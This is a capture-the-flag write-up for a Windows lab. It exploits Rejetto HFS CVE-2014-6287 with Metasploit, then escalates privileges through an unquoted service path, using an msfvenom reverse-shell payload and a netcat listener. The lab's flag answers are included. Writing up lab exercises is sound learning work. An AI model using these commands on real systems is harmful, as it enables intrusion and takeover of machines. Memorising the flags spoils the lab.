## 💥 Exploitation

### Step 1: Initial Access
- Rejetto HTTP File Server or CVE-2014-6287 is vulnerable against `exploit/windows/http/rejetto_hfs_exec`
    - Set options
        - `set RHOSTS TARGET_IP`
        - `set RPORT 8080`
- `exploit`

### Step 2: Meterpreter
- Now to access the shell with `shell`
- Looking at the path, the name of the user is `bill`
    - Look at their Desktop `dir \Users\bill\Desktop`
    - Find a `user.txt`
    - `type \Users\bill\Desktop`
    - Use Metasploit to get an initial shell. What is the user flag? → `b04763b6fcf51fcd7c13abc7db4fd365`


### Step 3: Privilege Escalation
- `exit` out of the shell
- `hashdump` on Meterpreter
    - Doesn't work: [-] priv_passwd_get_sam_hashes: Operation failed: 1168
- Try and migrate to higher privileges with `migrate PID`, but not enough privileges
- Open a new local terminal
    - Lab just wants us to upload `PowerUp.ps1`
        - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
        - `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1`
    - `upload PowerUp.ps1` in the meterpreter shell
- Load powershell into meterpreter with `load powershell`
    - Start it up with `powershell_shell`
    - Start up PowerUp with `. .\PowerUp.ps1`
    - Then, `Invoke-AllChecks`
- The thing we're looking for has
    - Unquoted Service Path
    - CanRestart = True
        - Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability? → `AdvancedSystemCareService9`
- File path overwrite
    - On the local terminal, make a malicious script to overwrite the path of the service `msfvenom -p windows/shell_reverse_tcp LHOST=10.144.76.249 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
        - Start a netcat reverse shell listener `nc -lvnp 4443`
    - On the target meterpreter shell, upload the script with `upload ASCService.exe`
    - Find the file path of `AdvancedSystemCareService9` to interact with it
        - Stop it `sc stop AdvancedSystemCareService9`
        - Copy the malicious script into the actual file path `copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`
        - Start it `sc start AdvancedSystemCareService9`
- Netcat listener now gives us NT Authority
    - Navigate to Administrator's desktop to get root flag
    - What is the root flag? → `9af5f314f57607c00fd09803a587db80`

## 🔑 Key Takeaways
- **Web server enumeration is critical** – always check all open ports (80 and 8080 in this case). The service on the non-standard port was the entry point.
- **Metasploit is your friend for known exploits** – CVE-2014-6287 was a simple module to run and got initial access quickly.
- **`hashdump` doesn't always work** – don't rely on it. When it fails (as it did here), move to other enumeration methods.
- **PowerUp.ps1 is a game-changer** – this PowerSploit script automates Windows privilege escalation enumeration. It found the unquoted service path vulnerability.
- **Unquoted Service Path vulnerability explained** – when a service path has spaces and isn't quoted, Windows tries to execute every part of the path. So `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe` tries to execute:
    1. `C:\Program.exe`
    2. `C:\Program Files (x86)\IObit\Advanced.exe`
    3. `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
    - If you can write to an earlier part of the path, you can hijack the service.
- **`CanRestart = True` is key** – if you can restart the service, you can trigger your malicious payload. Always check this in enumeration.
- **Service hijacking workflow**:
    1. Identify vulnerable service (unquoted path + writable location + restartable)
    2. Generate malicious executable with `msfvenom`
    3. Upload to target
    4. Stop the service (`sc stop`)
    5. Overwrite the legitimate executable
    6. Start the service (`sc start`)
    7. Catch reverse shell as SYSTEM/NT Authority
- **`sc` command is powerful** – use it to stop, start, and query services from the command line.
- **Always check `CanRestart`** – you can't exploit a service vulnerability if you can't restart the service to trigger your payload.
- **Manual verification matters** – `powershell -c "Get-Service"` lists all services and their status, useful when automation fails.

## 🧰 Tools Used
- **`nmap`** – aggressive scan to discover open ports and services.
- **Google Search** – researched Rejetto HTTP File Server to find CVE-2014-6287.
- **Metasploit** – used `exploit/windows/http/rejetto_hfs_exec` for initial access.
- **Meterpreter** – post-exploitation shell for file uploads, shell access, and enumeration attempts.
- **PowerUp.ps1** (PowerSploit) – automated Windows privilege escalation enumeration.
- **`msfvenom`** – generated malicious `exe-service` payload with reverse shell.
- **`nc` (netcat)** – set up listener to catch the reverse shell.
- **`sc` (Service Control)** – stopped, started, and managed services on Windows.
- **`wget`** – downloaded PowerUp.ps1 from GitHub.
- **`upload` (Meterpreter)** – transferred files to the target machine.
